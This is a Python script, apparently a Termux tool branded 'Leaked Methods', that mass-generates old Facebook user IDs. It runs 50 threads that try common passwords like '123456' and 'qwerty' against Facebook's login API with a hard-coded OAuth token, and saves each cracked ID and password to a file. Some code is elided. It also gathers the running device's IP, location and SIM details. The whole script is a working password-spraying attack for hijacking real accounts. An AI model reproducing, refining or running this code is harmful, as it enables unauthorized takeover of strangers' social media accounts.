#----------------------( IMPORT MODULES )---------------------+-#
import os, sys, json, uuid, string, random, requests,subprocess
from concurrent.futures import ThreadPoolExecutor
import os, sys, json, uuid, string, random, requests
from concurrent.futures import ThreadPoolExecutor as tred
sys.stdout.write(f'\x1b[1;35m\x1b]2; [🌏]< 𝙇𝙚𝙖𝙠𝙚𝙙 𝙈𝙚𝙩𝙝𝙤𝙙𝙨 📲💨 > [🇧🇩]\x07')
try:os.makedirs('/sdcard/𝙇𝙚𝙖𝙠𝙚𝙙 𝙈𝙚𝙩𝙝𝙤𝙙𝙨 📲💨')
except:
    pass
loop = 0 
oks = []
...
#______________Logo SYSTEM_______________#

def clear():os.system('clear')
#________________NETWORK______________#
import os,datetime, requests,subprocess, platform,json,speedtest
...
output = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',','|')
sim = output.replace(',', '\033[1;36m◆ \033[1;37m').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
vrsn = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
architecture_bits = platform.architecture()[0]
if architecture_bits=='32bit':
    bit=("32 Bit")
elif architecture_bits=='64bit':
    bit=("64 Bit")
ip = requests.get("https://api.ipify.org").text
devicebrand = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').strip()
ipinfo = requests.post('http://ip-api.com/json/'+ip)
z = json.loads(ipinfo.text)
country = z['country'].replace("Bangladesh","BANGLADESH")
ram_command = "cat /proc/meminfo | grep MemTotal | awk '{print $2}'"
rom_command = "df /data | tail -1 | awk '{print $2}'"
ram = round(int(subprocess.check_output(ram_command, shell=True).decode('utf-8').strip()) / 1024 / 1024, 1)
rom = round(int(subprocess.check_output(rom_command, shell=True).decode('utf-8').strip()) / 1024 / 1024, 1)
ram_rom_info = f"{E}RAM: {A}{ram} GB {D}<> {C}ROM: {A}{rom} GB"

logo = f"""
\033[32m{subprocess.run(['toilet', '-f', 'smblock', '      LEAKED  METHODS '], capture_output=True, text=True).stdout}\033[0m
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mOWNER      \x1b[1;91m: \x1b[1;96m𝗛 𝗠 𝗠𝗮𝗵𝗳𝘂𝘇
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mDEVELOPER  \x1b[1;91m: \x1b[1;93m𝐒𝐇𝐀𝐇𝐀𝐑𝐈𝐀𝐑 𝐙𝐀𝐌𝐀𝐍
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mSTATUS     \x1b[1;91m: \x1b[1;97mFREE [+] V \x1b[1;91m1.1
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mTELEGRAM   \x1b[1;91m: \x1b[1;92mhttps://t.me/leakedmethods404
\x1b[1;97m[\x1b[1;92m✪\x1b[1;97m] \x1b[1;95mTOOLS      \x1b[1;91m: \x1b[1;93mOLD ID ( 2009 -2012 ) Tools
{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{C}Your IP {B}= {A}{ip} {D}• {C}Country {B}= {A}{country}
{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{C}Device {D}=  {B}{devicebrand} {D}<> {A}{model} {D}<> {E}{bit}
{C}Device Specification {B}= {ram_rom_info}
{C}Mobile SIM    {D}=   {B}{sim}
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
print(logo) 
...
def main():
    ...
    print(logo) 
    print("\x1b[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[1;97m[\x1b[1;93m1\x1b[1;97m] \x1b[1;92mSTART CLONE [2009][WORK]")
    print("\x1b[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    select = input("\x1b[1;97mSELECT OPTION : \x1b[1;92m")
    if select == "1":
        fuckMyxAXN("100000")
    if select == "2":
    	print(" FUCK RANDOM")
...
def fuckMyxAXN(series):
    os.system('clear')
    print(logo) 
    os.system("xdg-open https://t.me/leakedmethods404")
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    ...
    for a in range(99999):
        ...
        gen.append(AXN)
    with ThreadPoolExecutor(max_workers=50) as Fuck_xnxx:
        os.system('clear')
        print(logo) 
        ####print("\x1b[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\x1b[1;92mTOTAL IDS - \x1b[1;97m"+str(len(gen)))
        print(f"{C}Today Day {B}= {E}{day}")
        print(f"{C}Today Date {B}= {E}{date} {D}• {C}Today Time {B}= {E}{currenttime}")
        print(f"{C}Today Month {B}= {E}{month}")
        print(f"{C}Today Year {B}= {E}{year}")
        print("\x1b[1;92mUSE FLIGHT MODE EVERY 3 MIN if you used Mobile Data")
        print("\x1b[1;92mUSE \x1b[1;93m1.1.1.1 \x1b[1;92mVPN FOR GOOD RESULT")
        print (f"{A}𝑶𝒕𝒉𝒆𝒓𝒘𝒊𝒔𝒆 𝒍𝒐𝒈𝒊𝒏 𝒂𝒇𝒕𝒆𝒓 3/7 𝒅𝒂𝒚𝒔 𝒍𝒂𝒕𝒆𝒓 ")     
        print("\x1b[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in gen:
            ids = SEX + love
            passlist = ["1234567890","112233","123456","123456789","asdfgh","qwerty","abcdef","abcde","1234567","12345678","123123"]
...
def SAGOR(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :sagor = '➤ 2009'
        elif ids[:9] in ['100000000']       :sagor = '➤ 2009'
        elif ids[:8] in ['10000000']        :sagor = '➤ 2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:sagor = '➤ 2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:sagor = '➤ 2010'
        elif ids[:6] in ['100001']          :sagor = '➤ 2010/2011'
        elif ids[:6] in ['100002','100003'] :sagor = '➤ 2011/2012'
        elif ids[:6] in ['100004']          :sagor = '➤ 2012/2013'
        elif ids[:6] in ['100005','100006'] :sagor = '➤ 2013/2014'
        elif ids[:6] in ['100007','100008'] :sagor = '➤ 2014/2015'
        elif ids[:6] in ['100009']          :sagor = '➤ 2014/2015'
        elif ids[:5] in ['10001']           :sagor = '➤ 2015/2016'
        elif ids[:5] in ['10002']           :sagor = '➤ 2016/2017'
        elif ids[:5] in ['10003']           :sagor = '➤ 2018/2019'
        elif ids[:5] in ['10004']           :sagor = '➤ 2019/2020'
        elif ids[:5] in ['10005']           :sagor = '➤ 2020'
        elif ids[:5] in ['10006','10007','']:sagor = '➤ 2021'
        elif ids[:5] in ['10008']           :sagor = '➤ 2022'
        elif ids[:5] in ['10009','6155']       :sagor = '➤ 2023'
        elif ids[:5] in ['6155']       :sagor = '➤ 2024'
        else:sagor=''
...
def Fucking_life(ids, passlist):
    ...
    sys.stdout.write(f"\r\x1b[1;93m{day}-\x1b[1;92m{date} [{loop}] \x1b[1;95m>>> \x1b[1;93mOK \x1b[1;91m: \x1b[1;97m[\x1b[1;92m{len(cps)}\x1b[1;97m]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            head = {'content-type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': pro,'user-agent': extra,'user-agent': windows(),'accept-encoding': 'gzip, deflate','x-fb-http-engine': 'Liger'}
            url = "https://b-api.facebook.com/auth/login"
            response = requests.post(url, data=data, headers=head, verify=True).json()
            if "access_token" in response:
                print(f"\r\r \x1b[1;93mOK >> \x1b[1;92m{ids} \x1b[1;91m• \x1b[1;97m{pas} {E}{SAGOR(ids)}                    \r\r")
                open("/sdcard/𝙇𝙚𝙖𝙠𝙚𝙙 𝙈𝙚𝙩𝙝𝙤𝙙𝙨 📲💨/OLD-ID.txt", "a").write("𝐃𝐚𝐭𝐞 𝐨𝐟 𝐢𝐝 𝐜𝐥𝐨𝐧𝐞𝐝 𝐭𝐨𝐝𝐚𝐲 : "+day+" - "+date+" / "+month+" / "+year+">>> 𝗧𝗶𝗺𝗲 :- "+currenttime+"\n"+ids + " | " + pas + "\n")
                oks.append(ids)
                break
